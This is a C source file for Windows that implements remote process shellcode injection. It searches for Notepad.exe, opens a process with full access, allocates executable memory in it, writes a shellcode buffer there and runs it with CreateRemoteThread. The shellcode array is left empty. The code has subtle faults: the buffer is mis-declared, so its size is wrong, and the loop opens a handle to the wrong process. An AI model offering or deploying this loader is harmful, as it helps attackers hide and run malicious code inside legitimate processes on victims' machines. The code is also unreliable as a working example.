#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <TlHelp32.h>




BOOL snapshotofprocess(LPWSTR processname, HANDLE* hremoteprocess,DWORD* drprocessid);
BOOL writingintheprocess(HANDLE hremoteprocess, SIZE_T spayload,unsigned char* pshellcode);
int main() {
	
	unsigned char* shellcode[] = {
		


	};

	unsigned char* pshellcode = shellcode;


	LPWSTR processname = L"Notepad.exe";

	SIZE_T	spayload = sizeof(shellcode);

	HANDLE hremoteprocess = NULL;
	DWORD drprocessid = NULL;
	

	if (snapshotofprocess(processname, &hremoteprocess, &drprocessid)) {
		printf("done\n");
	}
	else {
		exit(0);
	}

	writingintheprocess(hremoteprocess,spayload,pshellcode);


	printf("press <enter> to exit\n");
	getchar();


}


BOOL writingintheprocess(HANDLE hremoteprocess,SIZE_T spayload, unsigned char* pshellcode) {

	SIZE_T  snumberofbyteswritten = NULL;
	LPVOID lpvirtualaddress = NULL;
	lpvirtualaddress = VirtualAllocEx(hremoteprocess, NULL, spayload, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (lpvirtualaddress == NULL) {
		printf("the virtual alloc ex failed withe error no %d\n", GetLastError());
	}

if (!WriteProcessMemory(hremoteprocess, lpvirtualaddress, pshellcode, spayload, &snumberofbyteswritten) || spayload != snumberofbyteswritten) {
	printf("writeprocess memory failed with error no %d\n", GetLastError());


}





if (CreateRemoteThread(hremoteprocess, NULL, NULL, lpvirtualaddress, NULL, NULL, NULL) == NULL) {
	printf("createremotethread failed with error no %d", GetLastError());
}





}

BOOL snapshotofprocess(LPWSTR processname,HANDLE* hremoteprocess,DWORD* drprocessid) {

	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	BOOL state = TRUE;
	//HANDLE hremoteprocess = NULL;

	if(hsnapshot == INVALID_HANDLE_VALUE){
	
		printf("snap shot taking failed with error no %d\n", GetLastError());

		state = FALSE;
		return state;
}




	PROCESSENTRY32 proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};


	if (!Process32First(hsnapshot, &proc)) {

		printf("process 32 first failed with error no %d\n", GetLastError());
		}


	else {

		while (Process32Next(hsnapshot, &proc))
		{
			

	
				printf("process name: %ls \nprocessid: %ld\n", proc.szExeFile, proc.th32ProcessID);

				if (wcscmp(proc.szExeFile, processname) == 0) {
					printf("process matched at process id %ld_____%ls\n", proc.th32ProcessID,proc.szExeFile);
					break;
				}

				*drprocessid = proc.th32ProcessID;
				*hremoteprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc.th32ProcessID);

				if (*hremoteprocess == NULL) {
					printf("the openprocess failed with error no %d\n", GetLastError());
					
				}
				


			
		}
		return TRUE;

	}



}
